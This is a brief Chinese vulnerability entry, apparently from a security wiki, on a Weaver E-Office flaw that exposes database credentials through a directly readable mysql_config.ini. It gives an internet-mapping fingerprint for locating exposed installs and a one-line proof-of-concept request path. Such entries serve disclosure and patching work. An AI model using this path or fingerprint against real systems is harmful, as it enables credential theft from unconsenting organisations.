# 泛微OA E-Office mysql_config.ini 数据库信息泄漏漏洞

## 漏洞描述

泛微 E-Office mysql_config.ini文件可直接访问，泄漏数据库账号密码等信息

## 漏洞影响

<a-checkbox checked>泛微 E-Office</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="泛微-EOffice"</a-checkbox></br>

## 漏洞复现

产品页面

![img](../../../.vuepress/public/img/1628480634885-fb632cc0-9146-482e-80f3-b37c3e9b5990.png)

验证POC

```php
/mysql_config.ini
```

![img](../../../.vuepress/public/img/1628480658765-2ba02ffc-962a-48ac-a708-26bfaddf8182.png)